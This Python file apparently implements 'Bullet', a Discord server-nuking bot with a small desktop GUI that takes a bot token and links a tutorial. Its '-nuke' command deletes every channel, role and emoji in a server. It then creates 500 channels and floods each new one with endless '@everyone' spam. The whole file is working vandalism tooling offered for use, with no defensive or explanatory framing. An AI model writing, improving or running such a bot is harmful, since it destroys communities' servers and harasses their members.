import tkinter
import customtkinter
import time
import discord
from discord.ext import commands
import webbrowser



def bot():
    
    token1 = bot_token.get()
    intents = discord.Intents.default()
    intents.message_content = True

    bot = commands.Bot(command_prefix="-", case_sensitive=False, intents=intents)
    bot.remove_command("help")

    @bot.event
    async def on_ready():
        pass

    @bot.command()
    async def help(ctx):
        embed = discord.Embed(color=0x00b9d1)
        embed.add_field(name="Nuke", value="nukes the server", inline=False)
        embed.add_field(name="Exit", value="stops the bot", inline=False)
        embed.set_image(url="https://media.discordapp.net/attachments/980179582328111104/994162150232825856/standard_10.gif")
        await ctx.send(embed=embed)


    @bot.command()
    async def nuke(ctx):
        await ctx.message.delete()
        guild = ctx.guild
        for channel in guild.channels:
            try:
                await channel.delete()
            except:
                pass
        for role in guild.roles:
            try:
                await role.delete()
            except:
                pass
        for emoji in list(ctx.guild.emojis):
            try:
                    await emoji.delete()
            except:
                pass
        await guild.create_text_channel("Era too op")
        for channel in guild.text_channels:
            link = await channel.create_invite(max_age = 0, max_uses = 0)
        amount = 500
        for i in range(amount):
            await guild.create_text_channel("nuked-by-bullet")


    @bot.event
    async def on_guild_channel_create(channel):
        while True:
            await channel.send("@everyone Nuked by bullet")

    nuke1233 = nuke()

    bot.run(token1)


def open_tut():
    webbrowser.open_new_tab("https://www.youtube.com/watch?v=iYoKCLY965A")



customtkinter.set_appearance_mode("dark")



app = customtkinter.CTk()
app.geometry("494x312")
app.title("Bullet Main Menu")


frame1 = customtkinter.CTkFrame(master=app)
frame1.pack(fill="both", expand=True)

lab = customtkinter.CTkLabel(master=frame1, text="Welcome to Bullet",justify=tkinter.LEFT, text_font=("Arial",20)).pack(padx=20, pady=10)
bot_token = customtkinter.CTkEntry(master=frame1, placeholder_text="Bot Token", text_color='gray')
bot_token.pack()

conf = customtkinter.CTkButton(master=frame1, text="Confirm", corner_radius=8, fg_color='gray', hover_color='#7A7A7A', text_font=("Arial",11), command=bot).pack(padx=30, pady=20)


butt = customtkinter.CTkButton(master=frame1, text="Tutorial", corner_radius=8, fg_color='red', hover_color='darkred', text_font=("Arial",11), command=open_tut)
butt.pack()


app.mainloop()